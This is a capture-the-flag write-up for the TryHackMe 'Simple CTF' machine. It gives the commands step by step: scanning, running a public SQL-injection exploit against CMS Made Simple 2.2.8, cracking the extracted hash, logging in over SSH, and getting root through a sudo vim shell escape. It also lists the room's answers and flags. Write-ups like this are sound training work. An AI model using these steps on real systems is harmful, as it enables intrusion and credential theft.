TryHackMe: Simple CTF — Write-Up
1. Reconnaissance & Scanning

We begin by scanning the target IP for open ports and running services using nmap:

nmap -sC -sV -oN nmap.scan <TARGET_IP>
Scan Output Analysis
Port 21 (FTP): Running vsftpd 3.0.3 with anonymous login allowed.
Port 80 (HTTP): Running Apache httpd 2.4.18.
Port 2222 (SSH): Running OpenSSH 7.2p2 on a non-standard port.

Q1: How many services are running under port 1000?
Answer: 2 — FTP on port 21 and HTTP on port 80.

Q2: What is running on the higher port?
Answer: ssh — Port 2222.

2. Directory Brute-Forcing & Vulnerability Analysis

We use gobuster to scan for hidden directories on the web server:

gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt

We discover the directory /simple/.

Navigating to:

http://<TARGET_IP>/simple/

reveals an installation of CMS Made Simple version 2.2.8.

Searching for Known Exploits

We search for known exploits using searchsploit:

searchsploit cms made simple 2.2.8

This reveals Exploit-DB script 46635.py, targeting a Time-Based Blind SQL Injection vulnerability in the News module through the m1_idlist parameter.

Q3: What's the CVE you're using against the application?
Answer: CVE-2019-9053

Q4: To what kind of vulnerability is the application vulnerable?
Answer: sqli

3. Exploitation & Hash Cracking

We mirror the exploit script to our local machine and update it for Python 3 compatibility using 2to3:

searchsploit -m php/webapps/46635.py
2to3 -w 46635.py

We then run the exploit against the target URL with the --crack option using rockyou.txt:

python3 46635.py -u http://<TARGET_IP>/simple --crack -w /usr/share/wordlists/rockyou.txt
Exfiltrated Data
Field	Value
Username	mitch
Email	admin@admin.com
Salt	1dac0d92e9fa6bb2
MD5 Hash	0c01f4468bd75d7a84c7eb73846e8d96
Cracked Password	secret

Q5: What's the password?
Answer: secret

4. Initial Access & User Enumeration

With the retrieved credentials (mitch:secret), we log in via SSH using the non-standard port 2222:

ssh mitch@<TARGET_IP> -p 2222

Q6: Where can you login with the details obtained?
Answer: ssh

User Flag

After gaining an interactive shell as mitch, we locate and read the user flag:

cat /home/mitch/user.txt

Q7: What's the user flag?
Answer: G00d j0b, y0u f0und th3 u53r f14g!

User Enumeration

Checking the /home directory reveals another user account:

ls -la /home

Q8: Is there any other user in the home directory? What's its name?
Answer: sunshine

5. Privilege Escalation

We check for sudo privileges assigned to mitch:

sudo -l
Output
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

This means mitch can execute /usr/bin/vim as root without supplying a password.

Q9: What can you leverage to spawn a privileged shell?
Answer: vim

Root Shell

Using the vim capability, we spawn a root shell:

sudo vim -c ':!/bin/bash'

We verify our privileges:

whoami

Expected output:

root

Finally, we retrieve the root flag:

cat /root/root.txt

Q10: What's the root flag?
Answer: W3ll d0n3, y0u m4d3 1t!

Summary

The attack path was:

Nmap → Gobuster → CMS Made Simple 2.2.8 → CVE-2019-9053 (SQLi) → Credential Extraction → Password Cracking → SSH → User Flag → sudo -l → Vim → Root Shell → Root Flag

Key Takeaways
Always begin with enumeration.
Check all discovered services and non-standard ports.
Identify the technology and version running on web applications.
Use searchsploit to look for known vulnerabilities.
After obtaining credentials, test where they can be reused.
Always run sudo -l when you obtain a shell.
Check whether allowed binaries can be leveraged for privilege escalation.
